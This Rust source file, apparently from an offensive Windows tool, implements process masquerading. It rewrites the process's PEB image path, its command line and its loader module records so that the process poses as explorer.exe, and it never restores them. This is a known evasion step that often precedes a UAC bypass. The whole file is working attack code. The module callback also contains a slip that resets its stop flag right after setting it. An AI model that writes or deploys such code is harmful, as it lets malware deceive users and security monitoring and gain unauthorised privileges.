pub mod file_operation;

use crate::global::*;
use crate::shared::*;
use anyhow::*;
use ntapi::{
    ntldr::{LdrEnumerateLoadedModules, PLDR_DATA_TABLE_ENTRY},
    ntmmapi::NtAllocateVirtualMemory,
    ntpsapi::{NtCurrentPeb, NtCurrentProcess},
    ntrtl::{RtlAcquirePebLock, RtlInitUnicodeString, RtlReleasePebLock},
};
use std::{env, path::Path};
use winapi::{
    shared::ntdef::{BOOLEAN, NT_SUCCESS, PVOID},
    um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE},
};

// TODO: dynamic generate pathname, command line, and restore branch
// The restore variable always contains false because we never actually unlocks the masquerade :3
#[allow(non_snake_case)]
pub fn masquerade_process(restore: bool) -> Result<()> {
    unsafe {
        let current_peb = NtCurrentPeb();
        let mut g_lpszExplorer = 0x0 as PVOID;
        let mut region_size = 0x1000 as usize;

        if !restore {
            let status = NtAllocateVirtualMemory(
                NtCurrentProcess,
                &mut g_lpszExplorer as *const _ as *mut _,
                0,
                &mut region_size as _,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            );
            if !NT_SUCCESS(status) {
                bail!("NtAllocateVirtualMemory failed.");
            }
        }

        RtlAcquirePebLock();

        match env::var("SYSTEMROOT") {
            Ok(path) => {
                let p = Path::new(&path);
                let p = p.join("explorer.exe");
                wstr_cat(g_lpszExplorer as _, &e(p.to_str().unwrap()));
            }
            Err(_) => {
                wstr_cat(g_lpszExplorer as _, &e("C:\\Windows\\explorer.exe"));
            }
        };

        let command_line = e("explorer.exe");

        RtlInitUnicodeString(
            &mut (*(*current_peb).ProcessParameters).ImagePathName,
            g_lpszExplorer as _,
        );
        RtlInitUnicodeString(
            &mut (*(*current_peb).ProcessParameters).CommandLine,
            command_line.as_ptr(),
        );

        RtlReleasePebLock();

        LdrEnumerateLoadedModules(0, Some(LdrEnumModulesCallback), g_lpszExplorer as _);

        Ok(())
    }
}

#[allow(non_snake_case)]
unsafe extern "system" fn LdrEnumModulesCallback(
    ModuleInformation: PLDR_DATA_TABLE_ENTRY,
    Parameter: PVOID,
    Stop: *mut BOOLEAN,
) {
    let current_peb = NtCurrentPeb();

    let full_dll_name = Parameter as *mut u16;
    let base_dll_name = e("explorer.exe");

    if (*ModuleInformation).DllBase == (*current_peb).ImageBaseAddress {
        RtlInitUnicodeString(&mut (*ModuleInformation).FullDllName, full_dll_name);
        RtlInitUnicodeString(
            &mut (*ModuleInformation).BaseDllName,
            base_dll_name.as_ptr(),
        );

        *Stop = true as _;
    }

    *Stop = false as _;
}
